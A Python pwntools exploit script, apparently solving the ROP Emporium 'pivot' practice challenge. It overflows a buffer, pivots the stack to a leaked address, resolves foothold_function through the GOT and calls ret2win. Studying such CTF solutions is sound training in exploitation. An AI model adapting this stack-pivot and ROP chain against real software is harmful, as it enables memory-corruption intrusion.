#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

''' Let's get the ret2win offset...
$ readelf -s libpivot.so| grep foothold_function
    10: 0000000000000970    24 FUNC    GLOBAL DEFAULT   12 foothold_function
$ readelf -s libpivot.so| grep ret2win          
    18: 0000000000000abe    26 FUNC    GLOBAL DEFAULT   12 ret2win
$ python -c 'print hex(0x0000000000000abe-0x0000000000000970)'
'0x14e' <-- ret2win offset (can also be done through gdb...)
'''
# the following can also be found using pwntools directly...
ret2win_offset   = 0x14e
foothold_plt     = 0x00400850  # objdump -D pivot | grep foothold_function
foothold_got_plt = 0x00602048  # objdump -R pivot | grep foothold_function

# gadgets found with gdb's "dumprop"
pop_rax = 0x400b00   # pop rax; ret

def move_rsp(pivot):
    """moves stack pointer to pivot address"""
    global pop_rax
    chain =  "A"*40
    chain += p64(pop_rax)
    chain += p64(pivot)
    chain += p64(0x400b02)  # xchg rsp,rax; ret
    return chain

def ret2win():
    global foothold_got_plt, foothold_plt, pop_rax
    """ foothold_function() isn't called during normal program flow,
        so we'll have to call it first to populate it's .got.plt entry."""
    chain =  p64(foothold_plt)
    chain += p64(pop_rax)
    chain += p64(foothold_got_plt)
    chain += p64(0x400b05)   # mov rax,[rax]; ret --> rax points to foothold_function  
    chain += p64(0x400900)   # pop rbp; ret
    chain += p64(ret2win_offset)
    chain += p64(0x400b09)   # add rax,rbp; ret --> now rax points to ret2win
    chain += p64(0x40098e)   # call rax --> call ret2win
    return chain

def exploit():
    p = process('./pivot')
    pivot_addr = int(p.recv().splitlines()[4].split()[-1],16)
    p.sendline(ret2win())
    p.sendlineafter('> ', move_rsp(pivot_addr))
    print p.recv()

if __name__ == '__main__':
    exploit()
#_EOF